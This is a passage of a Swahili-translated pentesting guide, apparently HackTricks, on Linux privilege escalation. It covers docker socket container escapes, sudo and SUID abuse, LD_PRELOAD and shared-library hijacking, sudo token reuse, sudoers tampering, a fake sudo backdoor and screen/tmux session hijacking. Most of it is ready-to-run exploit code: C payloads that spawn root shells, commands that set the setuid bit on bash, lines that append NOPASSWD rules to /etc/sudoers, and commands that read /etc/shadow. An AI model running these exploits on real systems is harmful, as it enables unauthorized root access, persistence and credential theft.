2.  **Create a Container:** Tuma ombi la kuunda container linaloweka root directory ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoundwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho na container, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja kwenye container ukiwa na root-level access kwenye filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko ndani ya group `docker` una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa unapata kwamba unaweza kutumia amri ya **`ctr`** soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa unapata kwamba unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa **inter-Process Communication (IPC)** unaowawezesha programu kuingiliana kwa ufanisi na kushiriki data. Umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, hutoa framework imara kwa aina tofauti za mawasiliano ya programu.

Mfumo ni rahisi kubadilika, ukisaidia IPC ya msingi inayoongeza kubadilishana data kati ya processes, ikikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kutangaza matukio au signals, kukuza muunganisho mliyo sawa kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayokuja inaweza kusababisha music player ku-mute, ikiboresha uzoefu wa mtumiaji. Zaidi, D-Bus inasaidia mfumo wa remote object, kurahisisha service requests na method invocations kati ya programu, kufanya michakato ambayo hapo awali ilikuwa ngumu kuwa rahisi.

D-Bus inafanya kazi kwa msingi wa **allow/deny model**, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kulingana na athari jumla ya kanuni za sera zinazolingana. Sera hizi zinaelezea mwingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Sera ambazo hazina mtumiaji au group maalum zinafanya kazi kwa ujumla, wakati sera za muktadha "default" zinahusu wote ambao hawajafunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni kuvutia enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizofunguliwa

Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambazo haukuweza kuingiliana nazo kabla ya kufikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kukamata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Angalia **who** wewe ni, ni **privileges** gani ulizo nazo, ni **users** gani wako katika mifumo, ni ambao wanaweza **login** na ni walio na **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kupandisha idhini. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Itekeleze kwa kutumia:** **`systemd-run -t /bin/bash`**

### Vikundi

Angalia ikiwa wewe ni **mwanachama wa kundi fulani** ambacho kinaweza kukupa uruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu cha kuvutia kilichopo ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Passwords zilizojulikana

If you **know any password** of the environment **try to login as each user** using the password.

### Su Brute

Ikiwa hukujali kusababisha kelele nyingi na `su` na `timeout` binaries zipo kwenye kompyuta, unaweza kujaribu brute-force mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter pia inajaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa utagundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa na uwezo wa kupandisha ruhusa kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** yenye jina la amri fulani itakayotekelezwa na mtumiaji mwingine (root ideally) na ambayo **haipakiwa kutoka kwa folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya sudo inaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Directive hii inamruhusu mtumiaji **set an environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **iliyotegemea HTB machine Admirer**, ulikuwa **nyeti** kwa **PYTHONPATH hijacking** kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Kama sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzishwa isiyo ya mwingiliano ya Bash ili kuendesha msimbo wowote kama root unapoitisha amri inayoruhusiwa.

- Why it works: Kwa shells zisizo za mwingiliano, Bash husoma na kutekeleza `$BASH_ENV` kabla ya kuendesha script lengwa. Sheria nyingi za sudo huruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako itasomwa na kutekelezwa kwa ruhusa za root.

- Requirements:
- Sudo rule unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` bila mwingiliano, au script yoyote ya bash).
- `BASH_ENV` iko katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha usalama:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Zingatia logging ya sudo I/O na utoaji wa tahadhari wakati env vars zilizohifadhiwa zinapotumika.

### Njia za kupita (bypass) za utekelezaji wa sudo

**Jump** ili kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kui-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inapoitekeleza amri nyingine bila kubainisha njia yake (daima angalia yaliyomo ya binary ya SUID isiyo ya kawaida kwa kutumia** _**strings**_**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mwenye njia ya amri

Ikiwa binary ya **suid** **inapoitekeleza amri nyingine kwa kubainisha njia**, basi, unaweza kujaribu **export a function** iliyopewa jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha suid binary, function hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kubainisha maktaba moja au zaidi za kushiriki (.so files) zitakazopakiwa na loader kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama kupakia mapema maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kisitumiwe vibaya, hasa kwa executables za **suid/sgid**, mfumo unatekeleza masharti fulani:

- Loader haitazingatia **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zitakazopakiwa mapema ni zile tu zilizomo katika njia za kawaida ambazo pia ni suid/sgid.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha tamko **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambulika hata wakati amri zinatekelezwa kwa `sudo`, na hivyo inawezekana kusababisha utekelezaji wa code yoyote kwa ruhusa zilizoongezeka.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** inapoendeshwa
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> A similar privesc inaweza kutumiwa vibaya ikiwa attacker anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu yeye anadhibiti njia ambapo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** kwa usahihi. Hii inaweza kuhakikiwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa exploitation.

Ili exploit hii, mtu angeendelea kwa kuunda faili ya C, kwa mfano _"/path/to/.config/libcalc.c"_, inayojumuisha code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara ukikompailiwa na kutekelezwa, unalenga kuinua privileges kwa kuingilia ruhusa za faili na kuendesha shell yenye privileges zilizoongezeka.

Kompaili faili ya C iliyotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathiriwa kunapaswa kuchochea exploit, kuruhusu uwezekano wa kuathiri mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa kwamba tumepata SUID binary inayopakia library kutoka kwenye folder ambapo tunaweza kuandika, hebu tengeneza library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo mshambuliaji anaweza kuzitumia kuvuka vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza vigezo tu** katika amri.

Mradi unakusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibaya kuvunja restricted shells, escalate au maintain elevated privileges, kuhamisha files, spawn bind and reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini si nywila, unaweza escalate privileges kwa **kungoja utekelezaji wa amri ya sudo kisha kunyakua session token**.

Requirements to escalate privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza nywila)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kwa muda ku-	enable `ptrace_scope` na `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaumba binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuactivate the sudo token in your session** (huta-pata automatically a root shell, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **imilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) ita **kuunda faili ya sudoers** ambayo hufanya **sudo tokens ziwe za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini za kuandika** kwenye folda au kwenye faili yoyote iliyoundwa ndani yake, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata idhini za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na mafaili ndani ya `/etc/sudoers.d` huweka ni nani anaweza kutumia `sudo` na jinsi. Mafaili haya **kwa chaguo-msingi yanaweza kusomwa tu na user root na group root**.\
**Kama** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha ruhusa**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa kwa binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida huungana kwenye mashine na hutumia `sudo`** kuongeza ruhusa na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda sudo executable mpya** ambayo itatekeleza code yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kuongeza path mpya katika .bash_profile) ili wakati mtumiaji anatekeleza sudo, sudo executable yako itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (not bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zinazosomwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaonyesha folda zingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana ruhusa ya kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, yoyote ya faili ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyo ndani ya faili za usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kuongeza vibali.\
Tazama **jinsi ya kutumia upungufu huu wa usanidi** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumika na programu katika sehemu hii kama ilivyoainishwa kwenye kigezo `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba mbaya katika `/var/tmp` kwa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ndogo ya root privileges kwa process**. Hii inavunja root **privileges kuwa vitengo vidogo na vinavyotofautiana**. Kila kimoja cha vitengo hivi kinaweza kisha kupewa processes kwa kujitegemea. Kwa njia hii seti kamili ya privileges inapunguzwa, kupunguza hatari ya exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Kwenye directory, **bit ya "execute"** ina maana kuwa mtumiaji anayehusika anaweza "**cd**" ndani ya folda.\
Bit ya **"read"** ina maana mtumiaji anaweza **kuorodhesha** **files**, na bit ya **"write"** ina maana mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la ruhusa za kitengo cha mtumiaji, zikiwa na uwezo wa **kuvuruga ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaongeza udhibiti juu ya upatikanaji wa faili au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya group. Kiwango hiki cha **undani kinahakikisha usimamizi wa upatikanaji kwa usahihi zaidi**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpe** mtumiaji "kali" ruhusa za kusoma na kuandika kwa faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Vikao vya shell vilivyofunguliwa

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji tofauti (**root**).\
Katika **matoleo mapya kabisa** utakuwa na uwezo wa **connect** kwa screen sessions tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **matoleo ya zamani ya tmux**. Sikuwa na uwezo wa hijack kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na ruhusa za juu.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Hitilafu hii inatokea wakati wa kuunda ssh key mpya kwenye OS hizo, kwa sababu **tu 32,768 variations zilikuwa zinawezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kukokotolewa na **ukiwa na ssh public key unaweza kutafuta corresponding private key**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaporuhusiwa, inabainisha kama server inaruhusu login kwa akaunti zenye empty password strings. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa private key tu
- `forced-commands-only`: root anaweza kuingia kwa private key tu na ikiwa options za commands zimetajwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza mafaili yanayoshikilia public keys ambayo yanaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambayo yatabadilishwa na home directory. **Unaweza kuonyesha absolute paths** (zinaanza na `/`) au **relative paths kutoka kwa home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

